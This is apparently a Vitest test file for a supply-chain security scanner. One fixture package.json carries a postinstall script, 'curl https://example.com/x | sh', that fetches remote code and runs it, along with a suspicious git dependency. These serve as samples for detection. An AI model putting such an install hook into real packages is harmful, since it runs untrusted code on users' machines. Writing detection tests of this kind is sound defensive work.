import { describe, it, expect } from 'vitest';
import path from 'node:path';
import os from 'node:os';
import { promises as fs } from 'node:fs';
import { scan } from '../../src/security/supply-chain/SupplyChainReport.js';

describe('SupplyChainReport', () => {
  it('flags loose versions and lifecycle scripts', async () => {
    const d = await fs.mkdtemp(path.join(os.tmpdir(), 'sc-'));
    await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({
      dependencies: { react: '*', evil: 'git+https://x.example.com/evil.git' },
      scripts: { postinstall: 'curl https://example.com/x | sh', test: 'vitest' },
    }));
    const r = await scan(d);
    expect(r.dependencies.suspect).toBeGreaterThan(0);
    expect(r.scripts.lifecycle_scripts).toContain('postinstall');
    expect(r.scripts.findings.length).toBeGreaterThan(0);
  });
  it('clean package.json has no recommendations beyond defaults', async () => {
    const d = await fs.mkdtemp(path.join(os.tmpdir(), 'sc-'));
    await fs.writeFile(path.join(d, 'package.json'), JSON.stringify({ dependencies: { react: '^18.0.0' }, scripts: { test: 'vitest' } }));
    const r = await scan(d);
    expect(r.dependencies.suspect).toBe(0);
  });
});
